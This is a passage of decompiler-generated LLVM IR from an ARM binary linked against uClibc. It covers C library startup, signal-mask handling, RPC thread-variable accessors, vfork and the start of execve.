  %v3_14474 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_14474 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_14474, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1447c = load i32, i32* @r4, align 4
  %v1_1447c = load i32, i32* %r5.global-to-local, align 4
  %v2_1447c = inttoptr i32 %v1_1447c to i32*
  store i32 %v0_1447c, i32* %v2_1447c, align 4
  %v17_14528.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14524

dec_label_pc_14484:                               ; preds = %dec_label_pc_14444
  %v2_14484 = load i32, i32* %stack_var_-424, align 4
  %v7_14488 = icmp eq i32 %v2_14484, 1
  %v2_14490 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_14490, i32* @r4, align 4
  br i1 %v7_14488, label %dec_label_pc_14498, label %dec_label_pc_144cc

dec_label_pc_14498:                               ; preds = %dec_label_pc_14484
  store i32 %v2_14490, i32* @r1, align 4
  store i32 %v2_14490, i32* @r0, align 4
  %v0_144a0 = call i32 @nanosleep()
  store i32 %v0_144a0, i32* %r0.global-to-local, align 4
  store i32 %v0_144a0, i32* %r6.global-to-local, align 4
  %v0_144a8 = call i32 @__errno_location()
  store i32 %v2_143e0, i32* %r1.global-to-local, align 4
  store i32 %v0_144a8, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_144bc = inttoptr i32 %v0_144a8 to i32*
  %v2_144bc = load i32, i32* %v1_144bc, align 4
  store i32 %v2_144bc, i32* @r4, align 4
  %v3_144c0 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_144c0 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_144c0, i32 0)
  store i32 %v4_144c0, i32* %r0.global-to-local, align 4
  %v0_144c4 = load i32, i32* @r4, align 4
  %v1_144c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_144c4 = inttoptr i32 %v1_144c4 to i32*
  store i32 %v0_144c4, i32* %v2_144c4, align 4
  %v0_144f4.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_144f4

dec_label_pc_144cc:                               ; preds = %dec_label_pc_14484
  store i32 %v2_143e0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_144d8 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_144d8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_144d8, i32 0)
  store i32 %v4_144d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_144e8

dec_label_pc_144e8:                               ; preds = %dec_label_pc_143fc.dec_label_pc_144e8_crit_edge, %dec_label_pc_144cc
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_143fc.dec_label_pc_144e8_crit_edge ], [ %v2_14490, %dec_label_pc_144cc ]
  store i32 %storemerge.pre-phi, i32* @r0, align 4
  store i32 %storemerge.pre-phi, i32* @r1, align 4
  %v0_144ec = call i32 @nanosleep()
  store i32 %v0_144ec, i32* %r0.global-to-local, align 4
  store i32 %v0_144ec, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_144f4

dec_label_pc_144f4:                               ; preds = %dec_label_pc_14498, %dec_label_pc_144e8
  %v0_144f4 = phi i32 [ %v0_144f4.pr, %dec_label_pc_14498 ], [ %v0_144ec, %dec_label_pc_144e8 ]
  %v2_144f4 = icmp eq i32 %v0_144f4, 0
  br i1 %v2_144f4, label %dec_label_pc_14518, label %dec_label_pc_144fc

dec_label_pc_144fc:                               ; preds = %dec_label_pc_144f4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_14504 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_14504, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14524

dec_label_pc_14518:                               ; preds = %entry, %dec_label_pc_144f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14524

dec_label_pc_14520:                               ; preds = %dec_label_pc_143e0, %dec_label_pc_14430, %dec_label_pc_143bc
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14524

dec_label_pc_14524:                               ; preds = %dec_label_pc_144fc, %dec_label_pc_14518, %dec_label_pc_1445c, %dec_label_pc_14520
  %v17_14528 = phi i32 [ %v3_14504, %dec_label_pc_144fc ], [ 0, %dec_label_pc_14518 ], [ %v17_14528.pre, %dec_label_pc_1445c ], [ -1, %dec_label_pc_14520 ]
  %v2_14528 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14528, i32* @r4, align 4
  store i32 %v6_1438c, i32* @r5, align 4
  store i32 %v9_1438c, i32* @r6, align 4
  ret i32 %v17_14528

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 0 }
  uselistorder i32 %v1_14420, { 0, 2, 1 }
  uselistorder i32 %v1_143d8, { 1, 0, 2 }
  uselistorder i32 %v1_143ac, { 0, 2, 1 }
  uselistorder i32 %v16_1438c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 3, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 10, 11, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 8, 7, 9, 11, 12, 10, 14, 13, 15, 16, 18, 17, 19, 0 }
  uselistorder i32 ()* @nanosleep, { 2, 1, 3, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 5, 6, 7, 8, 10, 0, 2, 3, 13, 11, 12, 1, 4, 9 }
  uselistorder label %dec_label_pc_14524, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14520, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14518, { 1, 0 }
  uselistorder label %dec_label_pc_144f4, { 1, 0 }
  uselistorder label %dec_label_pc_144e8, { 1, 0 }
  uselistorder label %dec_label_pc_14418, { 1, 0 }
  uselistorder label %dec_label_pc_143a4, { 1, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2f3dc.768 to i32)
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_14568:
  %stack_var_-8 = alloca i32, align 4
  %v3_1453c = load i32, i32* @r4, align 4
  store i32 %v3_1453c, i32* %stack_var_-8, align 4
  %v2_1456c = load i32, i32* @global_var_2f3ec.773, align 4
  %v2_14570 = icmp eq i32 %v2_1456c, 0
  br i1 %v2_14570, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14568
  call void @__pseudo_branch(i32 %v2_1456c)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14568, %bb
  %v2_14580 = load i32, i32* @global_var_2f3f0.775, align 4
  %v2_14584 = icmp eq i32 %v2_14580, 0
  br i1 %v2_14584, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_14588 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_14588, i32* @r4, align 4
  %v9_14588 = load i32, i32* @r0, align 4
  ret i32 %v9_14588

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_14580)
  %v2_14594 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14594, i32* @r4, align 4
  %v8_14594 = load i32, i32* @r0, align 4
  ret i32 %v8_14594

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_145b0 = load i32, i32* @r0, align 4
  ret i32 %v1_145b0
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_145b4 = load i32, i32* @r4, align 4
  store i32 %v3_145b4, i32* %stack_var_-12, align 4
  %v6_145b4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_145c4 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_145c8 = icmp eq i32 %v2_145c4, -1
  br i1 %v7_145c8, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_145cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_145cc, i32* @r4, align 4
  store i32 %v6_145b4, i32* @r5, align 4
  ret i32 %v2_145c4

bb4:                                              ; preds = %entry
  %v0_145d0 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1d664.778 to i32), i32* @r0, align 4
  %v3_145d8 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1d664.778 to i32), i32 %v0_145d0)
  %v1_145dc = load i32, i32* @r5, align 4
  %v9_145dc = icmp eq i32 %v3_145d8, %v1_145dc
  br i1 %v9_145dc, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_145e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_145e0, i32* @r4, align 4
  store i32 %v6_145b4, i32* @r5, align 4
  ret i32 %v3_145d8

bb6:                                              ; preds = %bb4
  %v0_145e4 = call i32 @abort()
  %v0_145e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_145e8, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_145e4

; uselistorder directives
  uselistorder i32 %v2_145c4, { 1, 0 }
  uselistorder i32 %v6_145b4, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32)* @__libc_open, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_145f0 = load i32, i32* @global_var_2f3f4.780, align 4
  %v2_145f4 = icmp eq i32 %v2_145f0, 0
  br i1 %v2_145f4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v6_14600 = load i32, i32* @r0, align 4
  ret i32 %v6_14600

bb4:                                              ; preds = %entry
  store i32 1, i32* @global_var_2f3f4.780, align 4
  store i32 4096, i32* @global_var_2f3e8.239, align 4
  %v2_14620 = call i32 @__pthread_initialize_minimal()
  %v0_14634 = call i32 @_stdio_init()
  ret i32 %v0_14634
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_1464c = mul i32 %arg2, 4
  %v5_1464c = add i32 %tmp, %v4_1464c
  store i32 %v5_1464c, i32* @lr, align 4
  %v2_14650 = load i32, i32* %arg3, align 4
  %v2_14654 = ptrtoint i32* %stack_var_-120 to i32
  %v1_14658 = add i32 %v5_1464c, 4
  %v9_1465c = icmp eq i32 %v1_14658, %v2_14650
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_2f3e0.786, align 4
  store i32 %v1_14658, i32* @global_var_2f3e4.765, align 4
  store i32 %arg6, i32* @global_var_2f3f0.775, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_1465c, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_1464c, i32* @global_var_2f3e4.765, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %v2_14654, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %arg4, i32* @r7, align 4
  %v0_1469c = call i32 @__GI_memset()
  %storemerge.pre = load i32, i32* @global_var_2f3e4.765, align 4
  br label %dec_label_pc_146ac

dec_label_pc_146ac:                               ; preds = %dec_label_pc_146ac, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_146ac, %dec_label_pc_146ac ]
  %v1_146ac = inttoptr i32 %storemerge to i32*
  %v2_146ac = load i32, i32* %v1_146ac, align 4
  %v4_146ac = add i32 %storemerge, 4
  %v2_146b0 = icmp eq i32 %v2_146ac, 0
  br i1 %v2_146b0, label %dec_label_pc_146bc, label %dec_label_pc_146ac

dec_label_pc_146bc:                               ; preds = %dec_label_pc_146ac
  store i32 %v4_146ac, i32* @r4, align 4
  %v1_146dc22 = inttoptr i32 %v4_146ac to i32*
  %v2_146dc23 = load i32, i32* %v1_146dc22, align 4
  %v2_146e025 = icmp eq i32 %v2_146dc23, 0
  br i1 %v2_146e025, label %dec_label_pc_146e8, label %dec_label_pc_146c4

dec_label_pc_146c4:                               ; preds = %dec_label_pc_146bc, %dec_label_pc_146dc
  %v5_146c8 = phi i32 [ %v2_146dc, %dec_label_pc_146dc ], [ %v2_146dc23, %dec_label_pc_146bc ]
  %v2_146c4 = icmp ugt i32 %v5_146c8, 13
  %v7_146c4 = icmp eq i32 %v5_146c8, 14
  %v2_146c8 = xor i1 %v2_146c4, true
  %v3_146c8 = or i1 %v7_146c4, %v2_146c8
  br i1 %v3_146c8, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_146c4
  %v6_146c8 = and i32 %v5_146c8, 536870912
  %v7_146c8 = icmp ne i32 %v6_146c8, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_146c4, %bb42
  %v1_146d4 = phi i1 [ %v2_146c4, %dec_label_pc_146c4 ], [ %v7_146c8, %bb42 ]
  %v2_146cc = xor i1 %v1_146d4, true
  %v3_146cc = or i1 %v7_146c4, %v2_146cc
  br i1 %v3_146cc, label %bb44, label %dec_label_pc_146dc

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_146dc

dec_label_pc_146dc:                               ; preds = %bb43, %bb44
  store i32 83672, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_146cc, i32 ptrtoint (i32* @global_var_12600.789 to i32))
  %v0_146d8 = load i32, i32* @r4, align 4
  %v1_146d8 = add i32 %v0_146d8, 8
  store i32 %v1_146d8, i32* @r4, align 4
  %v1_146dc = inttoptr i32 %v1_146d8 to i32*
  %v2_146dc = load i32, i32* %v1_146dc, align 4
  %v2_146e0 = icmp eq i32 %v2_146dc, 0
  br i1 %v2_146e0, label %dec_label_pc_146e8, label %dec_label_pc_146c4

dec_label_pc_146e8:                               ; preds = %dec_label_pc_146dc, %dec_label_pc_146bc
  %v1_146ec = call i32 @_dl_aux_init(i32 %v2_14654)
  store i32 %v1_146ec, i32* @r0, align 4
  %v1_146f0 = call i32 @__GI___uClibc_init(i32 %v1_146ec)
  store i32 %v1_146f0, i32* @r0, align 4
  %v2_146fc = icmp eq i32 %tmp37, 0
  br i1 %v2_146fc, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_146e8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_146e8, %bb45
  %v0_1470c = phi i32 [ %tmp37, %dec_label_pc_146e8 ], [ 4096, %bb45 ]
  %v3_14704 = icmp eq i32 %tmp36, -1
  %v8_14704 = icmp eq i32 %tmp36, -1
  store i32 %v0_1470c, i32* @global_var_2f3e8.239, align 4
  br i1 %v3_14704, label %dec_label_pc_14714, label %dec_label_pc_1473c

dec_label_pc_14714:                               ; preds = %bb46
  %v0_14714 = call i32 @getuid()
  store i32 %v0_14714, i32* @r0, align 4
  store i32 %v0_14714, i32* @r4, align 4
  %v0_1471c = call i32 @geteuid()
  %v0_14720 = load i32, i32* @r4, align 4
  %v9_14720 = icmp eq i32 %v0_14720, %v0_1471c
  br i1 %v9_14720, label %dec_label_pc_14728, label %dec_label_pc_14764

dec_label_pc_14728:                               ; preds = %dec_label_pc_14714
  %v1_14728 = call i32 @getgid(i32 %v0_1471c)
  store i32 %v1_14728, i32* @r0, align 4
  store i32 %v1_14728, i32* @r4, align 4
  %v0_14730 = call i32 @getegid()
  %v0_14734 = load i32, i32* @r4, align 4
  %v9_14734 = icmp eq i32 %v0_14734, %v0_14730
  br i1 %v9_14734, label %dec_label_pc_1473c, label %dec_label_pc_14764

dec_label_pc_1473c:                               ; preds = %dec_label_pc_14728, %bb46
  br i1 %v8_14704, label %dec_label_pc_147d0, label %dec_label_pc_14748

dec_label_pc_14748:                               ; preds = %dec_label_pc_1473c
  %v9_1474c = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_1474c, label %dec_label_pc_14754, label %dec_label_pc_14764

dec_label_pc_14754:                               ; preds = %dec_label_pc_14748
  br label %dec_label_pc_14764

dec_label_pc_14764:                               ; preds = %dec_label_pc_14754, %dec_label_pc_14748, %dec_label_pc_14728, %dec_label_pc_14714
  %v2_1476c = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_14778 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_14784 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_147d0

dec_label_pc_147d0:                               ; preds = %dec_label_pc_14764, %dec_label_pc_1473c
  %v0_14794 = load i32, i32* @r6, align 4
  %v1_14794 = inttoptr i32 %v0_14794 to i32*
  %v2_14794 = load i32, i32* %v1_14794, align 4
  store i32 %v2_14794, i32* @global_var_2abb0, align 4
  store i32 %arg5, i32* @global_var_2f3ec.773, align 4
  %v2_147d0 = icmp eq i32 %arg4, 0
  br i1 %v2_147d0, label %dec_label_pc_1480c, label %bb47

bb47:                                             ; preds = %dec_label_pc_147d0
  br label %dec_label_pc_1480c

dec_label_pc_1480c:                               ; preds = %dec_label_pc_147d0, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_1481c = call i32 @__errno_location()
  %v2_14824 = inttoptr i32 %v1_1481c to i32*
  store i32 0, i32* %v2_14824, align 4
  %v1_14838 = call i32 @__h_errno_location()
  %v2_14840 = inttoptr i32 %v1_14838 to i32*
  store i32 0, i32* %v2_14840, align 4
  %v0_14850 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_1485c = call i32 @__GI_exit(i32 %v0_14850)
  ret i32 %v1_1485c

; uselistorder directives
  uselistorder i32 %v2_146dc, { 1, 0 }
  uselistorder i32 %v1_146d8, { 1, 0 }
  uselistorder i1 %v2_146c4, { 1, 0 }
  uselistorder i32 %v4_146ac, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_2f3e8.239, { 1, 0, 2, 3, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1480c, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_146dc, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_146c4, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @rpc_thread_multi() local_unnamed_addr {
bb:
  store i32 2, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2f3fc.805 to i32), i32* @r1, align 4
  %v0_148b4 = call i32 @__pthread_internal_tsd_set()
  ret i32 %v0_148b4
}

define i32 @__rpc_thread_variables() local_unnamed_addr {
bb:
  %stack_var_-8 = alloca i32, align 4
  %v3_148c8 = load i32, i32* @r4, align 4
  store i32 %v3_148c8, i32* %stack_var_-8, align 4
  store i32 84196, i32* @lr, align 4
  call void @__pseudo_branch(i32 64000)
  br i1 false, label %.threadthread-pre-split, label %dec_label_pc_149a8

.threadthread-pre-split:                          ; preds = %bb
  br i1 false, label %dec_label_pc_1494c, label %dec_label_pc_149a8

dec_label_pc_1494c:                               ; preds = %.threadthread-pre-split
  br i1 undef, label %dec_label_pc_14988, label %dec_label_pc_14974

dec_label_pc_14974:                               ; preds = %dec_label_pc_1494c
  br label %dec_label_pc_149a8

dec_label_pc_14988:                               ; preds = %dec_label_pc_1494c
  br label %dec_label_pc_149a8

dec_label_pc_149a8:                               ; preds = %.threadthread-pre-split, %bb, %dec_label_pc_14974, %dec_label_pc_14988
  %v2_149ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_149ac, i32* @r4, align 4
  ret i32 2

; uselistorder directives
  uselistorder label %dec_label_pc_149a8, { 3, 2, 0, 1 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  %v0_149cc = call i32 @__rpc_thread_variables()
  %v9_149d8 = icmp eq i32 %v0_149cc, ptrtoint (i32* @global_var_2f3fc.805 to i32)
  br i1 %v9_149d8, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v2_149dc = add i32 %v0_149cc, 148
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_149e0 = phi i32 [ ptrtoint (i32* @global_var_2f61c.819 to i32), %entry ], [ %v2_149dc, %bb ]
  ret i32 %v0_149e0

; uselistorder directives
  uselistorder i32 148, { 1, 2, 3, 11, 4, 6, 5, 7, 8, 9, 0, 10 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  %v0_149f4 = call i32 @__rpc_thread_variables()
  %v9_14a00 = icmp eq i32 %v0_149f4, ptrtoint (i32* @global_var_2f3fc.805 to i32)
  br i1 %v9_14a00, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v2_14a04 = add i32 %v0_149f4, 144
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_14a08 = phi i32 [ ptrtoint (i32* @global_var_2f630.822 to i32), %entry ], [ %v2_14a04, %bb ]
  ret i32 %v0_14a08

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  %v0_14a1c = call i32 @__rpc_thread_variables()
  %v9_14a28 = icmp eq i32 %v0_14a1c, ptrtoint (i32* @global_var_2f3fc.805 to i32)
  br i1 %v9_14a28, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v2_14a2c = add i32 %v0_14a1c, 128
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_14a30 = phi i32 [ ptrtoint (i32* @global_var_2f620.825 to i32), %entry ], [ %v2_14a2c, %bb ]
  ret i32 %v0_14a30

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_14a44 = call i32 @__rpc_thread_variables()
  %v9_14a50 = icmp eq i32 %v0_14a44, ptrtoint (i32* @global_var_2f3fc.805 to i32)
  br i1 %v9_14a50, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_14a58 = phi i32 [ %v0_14a44, %entry ], [ ptrtoint (i32* @global_var_2f590.828 to i32), %bb ]
  ret i32 %v5_14a58

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
bb:
  %stack_var_-8 = alloca i32, align 4
  %v3_14a68 = load i32, i32* @r4, align 4
  store i32 %v3_14a68, i32* %stack_var_-8, align 4
  %v6_14a68 = load i32, i32* @lr, align 4
  store i32 84616, i32* @lr, align 4
  call void @__pseudo_branch(i32 64000)
  store i32 2, i32* @r4, align 4
  br i1 icmp eq (i32 ptrtoint (i32* @global_var_2f3fc.805 to i32), i32 2), label %bb3, label %bb4

bb3:                                              ; preds = %bb
  %v3_14a9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_14a9c, i32* @r4, align 4
  ret i32 2

bb4:                                              ; preds = %bb
  %v0_14aa0 = call i32 @__rpc_thread_svc_cleanup()
  %v1_14aa4 = call i32 @__rpc_thread_clnt_cleanup(i32 %v0_14aa0)
  %v0_14aa8 = load i32, i32* @r4, align 4
  %v1_14aa8 = add i32 %v0_14aa8, 152
  %v2_14aa8 = inttoptr i32 %v1_14aa8 to i32*
  %v3_14aa8 = load i32, i32* %v2_14aa8, align 4
  store i32 %v3_14aa8, i32* @r0, align 4
  %v0_14aac = call i32 @free()
  %v0_14ab0 = load i32, i32* @r4, align 4
  %v1_14ab0 = add i32 %v0_14ab0, 156
  %v2_14ab0 = inttoptr i32 %v1_14ab0 to i32*
  %v3_14ab0 = load i32, i32* %v2_14ab0, align 4
  store i32 %v3_14ab0, i32* @r0, align 4
  %v0_14ab4 = call i32 @free()
  %v0_14ab8 = load i32, i32* @r4, align 4
  %v1_14ab8 = add i32 %v0_14ab8, 160
  %v2_14ab8 = inttoptr i32 %v1_14ab8 to i32*
  %v3_14ab8 = load i32, i32* %v2_14ab8, align 4
  store i32 %v3_14ab8, i32* @r0, align 4
  %v0_14abc = call i32 @free()
  %v0_14ac0 = load i32, i32* @r4, align 4
  %v1_14ac0 = add i32 %v0_14ac0, 188
  %v2_14ac0 = inttoptr i32 %v1_14ac0 to i32*
  %v3_14ac0 = load i32, i32* %v2_14ac0, align 4
  store i32 %v3_14ac0, i32* @r0, align 4
  %v0_14ac4 = call i32 @free()
  %v0_14ac8 = load i32, i32* @r4, align 4
  %v1_14ac8 = add i32 %v0_14ac8, 172
  %v2_14ac8 = inttoptr i32 %v1_14ac8 to i32*
  %v3_14ac8 = load i32, i32* %v2_14ac8, align 4
  store i32 %v3_14ac8, i32* @r0, align 4
  %v0_14acc = call i32 @free()
  %v0_14ad0 = load i32, i32* @r4, align 4
  %v1_14ad0 = add i32 %v0_14ad0, 176
  %v2_14ad0 = inttoptr i32 %v1_14ad0 to i32*
  %v3_14ad0 = load i32, i32* %v2_14ad0, align 4
  store i32 %v3_14ad0, i32* @r0, align 4
  %v0_14ad4 = call i32 @free()
  %v0_14ad8 = load i32, i32* @r4, align 4
  store i32 %v0_14ad8, i32* @r0, align 4
  %v0_14adc = call i32 @free()
  store i32 0, i32* @r1, align 4
  store i32 2, i32* @r0, align 4
  %v3_14af8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_14af8, i32* @r4, align 4
  store i32 %v6_14a68, i32* @lr, align 4
  %v0_14b00 = call i32 @__pthread_internal_tsd_set()
  ret i32 %v0_14b00

; uselistorder directives
  uselistorder i32 172, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2f3fc.805 to i32), { 0, 2, 3, 4, 5, 1 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_14b14 = load i32, i32* @r4, align 4
  store i32 %v3_14b14, i32* %stack_var_-8, align 4
  %v0_14b18 = load i32, i32* @r0, align 4
  %v0_14b1c = call i32 @__errno_location()
  %v1_14b20 = sub i32 0, %v0_14b18
  %v2_14b24 = inttoptr i32 %v0_14b1c to i32*
  store i32 %v1_14b20, i32* %v2_14b24, align 4
  %v2_14b2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b2c, i32* @r4, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1) local_unnamed_addr {
entry:
  %v0_14b34 = load i32, i32* @r1, align 4
  %v2_14b34 = icmp eq i32 %v0_14b34, 0
  br i1 %v2_14b34, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_14b44 = phi i32 [ %v0_14b34, %entry ], [ 1, %bb ]
  ret i32 %v1_14b44

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_14b48(i32 %arg1) local_unnamed_addr {
dec_label_pc_14b48:
  ret i32 %arg1
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_14b50 = call i32 @fork()
  store i32 %v0_14b50, i32* @r0, align 4
  %v2_14b54 = icmp ugt i32 %v0_14b50, -4097
  br i1 %v2_14b54, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_14b68, %entry
  %merge = phi i32 [ %v0_14b50, %entry ], [ %v0_14b68, %dec_label_pc_14b68 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_14b60 = icmp eq i32 %v0_14b50, -38
  br i1 %v4_14b60, label %dec_label_pc_14b68, label %bb2

dec_label_pc_14b68:                               ; preds = %bb1
  %v0_14b68 = call i32 @fork()
  store i32 %v0_14b68, i32* @r0, align 4
  %v2_14b6c = icmp ugt i32 %v0_14b68, -4097
  br i1 %v2_14b6c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_14b68
  %v0_14b74 = call i32 @__syscall_error()
  ret i32 %v0_14b74

; uselistorder directives
  uselistorder i32 %v0_14b68, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 1, 0 }
  uselistorder i32 ()* @fork, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b80 = load i32, i32* @r4, align 4
  store i32 %v3_14b80, i32* %stack_var_-8, align 4
  %v0_14b84 = load i32, i32* @r0, align 4
  %v1_14b84 = inttoptr i32 %v0_14b84 to i8*
  %v2_14b84 = load i32, i32* @r1, align 4
  %v3_14b84 = inttoptr i32 %v2_14b84 to i8*
